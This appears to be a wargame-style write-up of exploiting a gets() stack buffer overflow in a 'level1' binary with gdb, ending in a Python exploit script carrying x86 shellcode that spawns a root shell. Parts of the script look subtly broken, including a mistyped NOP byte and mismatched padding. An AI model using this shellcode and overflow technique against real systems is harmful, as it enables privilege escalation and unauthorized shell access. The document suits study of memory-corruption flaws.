We can see a binary called level1 in the home

After an execution of this, we can see that it's waiting for an entry, then nothing
after an enter pressed.

Let's open it with gdb.

We can see than eax is filled at main+9 by : eax <- esp+0x10

After a 
x *(esp value)+0x10
We can see the string : "1/level1"

We know that at the beginning of the program, esp fill the path of the program
The path of the program at the address + 0x10 is therefore "1/level1"

Next to this instruction, we can see a gets call with passed "1/level1"
as parameter.

gets is reputed for its bufferoverflow security exploit.

Let's try a bufferoverflow and override EIP which is the register which handle
the next instruction to execute to a shellcode which will help us to execute
a sh.

 1 : create a A generator in tmp

#!/usr/bin/python
print 'A' * 74

 2 : launch the program with GDB then run the program with the print of 
 a_generator with

run < <(python /tmp/a_generator)

help with the commande : x/65wx $esp
It should fill the register from esp to ebp, of A. If not, adjuste it.
ebp should be : 414141 and eip+0x4 should be a random value.

Next, modify the python to replace the ebp section with some different value
which will allow you a better view of the place.

print ('A' * 72) + "1234"

It should print 0x34333231 at the ebp address, just after the 41 suit.

 3 : Now we can write our file exploit to inject our shellcode.

The shellcode was found on internet.
\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80


#!/usr/bin/python
nopsled = 'x\90' * 64
shellcode = ('\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80')
padding = 'A' * (112 - 64 - 32)
eip = '1234'
print nopsled + shellcode + padding + eip

Now we can execute again the program in gdb with the result of the python program
and print again x/65xw $esp






